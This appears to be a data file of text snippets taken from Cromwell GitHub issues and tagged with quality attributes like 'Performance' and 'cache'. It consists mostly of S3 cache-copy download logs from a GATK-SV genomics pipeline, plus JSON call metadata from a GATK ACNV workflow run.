focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:140975,cache,cacheCopy,140975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-38/cacheCopy/SR00c.HG01799.txt.gz.tbi; 1608597216321,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz; 1608597218252,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi; 1608597219467,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:76740,cache,cacheCopy,76740,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi; 1608597520303,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz; 1608597523198,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz; 1608597524955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:161765,cache,cacheCopy,161765,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi; 1608597281347,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz; 1608597283995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz; 1608597286657,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:94196,cache,cacheCopy,94196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz; 1608597060059,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi; 1608597062290,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz; 1608597066051,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:33746,cache,cacheCopy,33746,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi; 1608597397902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz; 1608597399545,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi; 1608597402775,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:125370,cache,cacheCopy,125370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz.tbi; 1608597105908,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz; 1608597108506,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz; 1608597111201,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:46205,cache,cacheCopy,46205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi; 1608597042942,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz; 1608597045131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi; 1608597046875,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:28743,cache,cacheCopy,28743,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi; 1608597571205,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz; 1608597573618,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz; 1608597577251,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-128/cacheCopy/SR00c.NA19350.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:176761,cache,cacheCopy,176761,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi; 1608597299791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz; 1608597301211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi; 1608597303071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:98549,cache,cacheCopy,98549,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""jobId"": ""28182"",; ""backend"": ""Local"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-2/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-2"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:25.038Z""; },; {; ""shardIndex"": 3,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:25.040Z""; },; {; ""Call caching read result"": ""Cache Miss"",; ""executionStatus"": ""Running"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-4/execution/stdout"",; ""shardIndex"": 4,; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""input_bam"": ""/data/public/SM-74P3M.bam"",; ""ref_fasta"": ""/data/ref/Homo_sapiens_assembly19.fasta"",; ""keep_duplicate_reads"": true,; ""grouping"": ""SAMPLE"",; ""disable_all_read_filters"": false,; ""ref_fasta_fai"": ""/data/ref/Homo_sapiens_assembly19.fasta.fai"",; ""bam_idx"": ""/data/public/SM-74P3M.bam.bai"",; ""entity_id"": ""SM-74P3M"",; ""disable_sequence_dictionary_validation"": true,; ""mem"": 2,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""transform"": ""PCOV"",; ""isWGS"": false,; ""ref_fasta_dict"": ""/data/ref/Homo_sapiens_assembly19.dict"",; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""jobId"": ""28178"",; ""backend"": ""L",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:51984,Cache,Cache,51984,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""jobId"": ""28185"",; ""backend"": ""Local"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-7/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-7"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:25.038Z""; },; {; ""shardIndex"": 8,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:25.069Z""; },; {; ""Call caching read result"": ""Cache Miss"",; ""executionStatus"": ""Running"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-9/execution/stdout"",; ""shardIndex"": 9,; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""input_bam"": ""/data/public/SM-74P1Z.bam"",; ""ref_fasta"": ""/data/ref/Homo_sapiens_assembly19.fasta"",; ""keep_duplicate_reads"": true,; ""grouping"": ""SAMPLE"",; ""disable_all_read_filters"": false,; ""ref_fasta_fai"": 